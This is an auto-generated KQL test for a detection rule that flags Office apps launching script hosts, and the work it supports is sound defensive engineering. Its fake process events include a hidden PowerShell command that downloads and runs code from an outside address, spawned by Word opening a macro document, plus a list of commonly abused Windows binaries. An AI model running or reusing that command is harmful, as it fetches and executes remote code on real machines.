// Generated by tools/build_tests.py from tests/cases/office-app-spawns-script-host.yaml. Do not edit by hand.
let Test_office_app_spawns_script_host = () {
let DeviceProcessEvents = datatable(AgoSeconds:long, DeviceName:string, AccountName:string, FileName:string, FolderPath:string, ProcessCommandLine:string, ProcessVersionInfoOriginalFileName:string, SHA256:string, InitiatingProcessFileName:string, InitiatingProcessCommandLine:string, InitiatingProcessParentFileName:string) [
    600, "fin-ws-07", "carol", "powershell.exe", "", "powershell.exe -nop -w hidden -c iex(iwr http://198.51.100.9/a)", "", "", "WINWORD.EXE", "\"WINWORD.EXE\" /n \"C:\\Users\\carol\\Downloads\\Invoice.docm\"", "",
    600, "fin-ws-08", "dave", "splwow64.exe", "", "splwow64.exe 8192", "", "", "EXCEL.EXE", "", "",
    600, "it-ws-01", "alice", "powershell.exe", "", "powershell.exe", "", "", "explorer.exe", "", ""
]
| extend TimeGenerated = now() - AgoSeconds * 1s
| project-away AgoSeconds;
let RuleResults = () {
let OfficeApps = dynamic(["winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe", "onenote.exe", "msaccess.exe", "mspub.exe", "visio.exe"]);
let SuspiciousChildren = dynamic(["powershell.exe", "pwsh.exe", "cmd.exe", "wscript.exe", "cscript.exe", "mshta.exe", "rundll32.exe",
    "regsvr32.exe", "certutil.exe", "bitsadmin.exe", "msbuild.exe", "schtasks.exe", "wmic.exe", "curl.exe", "installutil.exe",
    "regasm.exe", "regsvcs.exe", "forfiles.exe", "hh.exe"]);
DeviceProcessEvents
| where TimeGenerated > ago(1h)
| where InitiatingProcessFileName in~ (OfficeApps) and FileName in~ (SuspiciousChildren)
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
};
RuleResults()
| summarize Rows = count(), Include1 = countif(tostring(DeviceName) == "fin-ws-07" and tostring(FileName) == "powershell.exe"), Exclude1 = countif(tostring(DeviceName) == "fin-ws-08"), Exclude2 = countif(tostring(DeviceName) == "it-ws-01")
| extend Test = "office-app-spawns-script-host", Expected = "1 row(s); 1 must appear; 2 must not"
| extend Result = iff(Rows == 1 and Include1 >= 1 and Exclude1 == 0 and Exclude2 == 0, "PASS", "FAIL")
| project Test, Result, Rows, Expected
};
